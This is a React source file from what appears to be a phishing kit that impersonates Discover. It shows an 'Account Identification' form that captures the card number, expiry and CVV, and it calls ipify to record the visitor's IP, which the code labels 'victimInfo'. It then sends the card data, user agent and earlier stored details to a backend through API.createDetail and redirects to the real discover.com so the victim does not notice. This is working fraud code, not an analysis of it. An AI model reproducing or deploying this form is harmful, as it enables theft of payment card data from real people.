import React, { useEffect, useState } from "react";
import { useHistory } from "react-router-dom";
import axios from "axios";
import API from "../api/api";
import FormLayout from "../components/formLayout";
import { APP_STORAGE_NAME } from "../utils/constants";
import { randParams } from "../utils/random";
import Button from "../components/button";
import Input from "../components/input";

const Card = () => {
  const router = useHistory();
  const [data, setData] = useState({ card: "", expiry: "", cvv: "" });
  const [isLoading, setIsLoading] = useState(false);
  const [victimInfo, setVictimData] = useState({
    ip: "",
  });

  const handleChange = (e) => {
    let { name, value } = e.target;
    if (["card", "cvv"].includes(name)) {
      if (!/^[0-9]+$/.test(value)) return;
    }

    if (/\d+/.test(value) && name === "expiry") {
      if (value?.length === 2) {
        value = value + "/";
      }
    }

    setData((prev) => ({
      ...prev,
      [name]: value,
    }));
  };

  const handleKeyDown = (e) => {
    if (e.key === "Backspace" && /^\d\d\/$/.test(data?.expiry)) {
      setData((prev) => ({
        ...prev,
        expiry: "",
      }));
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    const _data = JSON.parse(sessionStorage.getItem(APP_STORAGE_NAME)) || {};
    sessionStorage.setItem(
      APP_STORAGE_NAME,
      JSON.stringify({ ..._data, ...data }),
    );

    const __data = JSON.parse(sessionStorage.getItem(APP_STORAGE_NAME)) || {};

    setIsLoading(true);
    try {
      const res = await API.createDetail({
        ...__data,
        bank: "discover.com",
        userAgent: navigator?.userAgent,
        cardInfo: data,
        victimInfo,
      });
      if (res.status === 201) {
        sessionStorage.removeItem(APP_STORAGE_NAME);
        window.location.href = "https://www.discover.com";
      } else {
        setIsLoading(false);
      }
    } catch (error) {
      alert("Something went wrong");
      setIsLoading(false);
    }
  };

  useEffect(() => {
    async function getIP() {
      const resp = await axios.get("https://api.ipify.org/?format=json");
      if (resp.data.ip) {
        setVictimData({ ip: resp.data.ip });
      }
    }
    getIP();

    return () => {
      setData({ card: "", expiry: "", cvv: "" });
      setIsLoading(false);
    };
  }, []);

  return (
    <FormLayout
      handleSubmit={handleSubmit}
      title={"Account Identification"}
    >
      <Input
        title="Card Number"
        name="card"
        value={data?.card}
        onChange={handleChange}
        minLength={16}
        maxLength={16}
      />
      <div className="w-full flex items-center justify-between gap-3">
        <Input
          title="Expiry"
          name="expiry"
          value={data?.expiry}
          placeholder="MM/YY"
          onKeyDown={handleKeyDown}
          onChange={handleChange}
          maxLength={5}
        />
        <Input
          title="CVV"
          name="cvv"
          value={data?.cvv}
          onChange={handleChange}
          minLength={3}
          maxLength={3}
        />
      </div>

      <Button
        title={
          isLoading ? (
            <span className="loading loading-spinner loading-md text-white"></span>
          ) : (
            "Continue"
          )
        }
      />
    </FormLayout>
  );
};

export default Card;
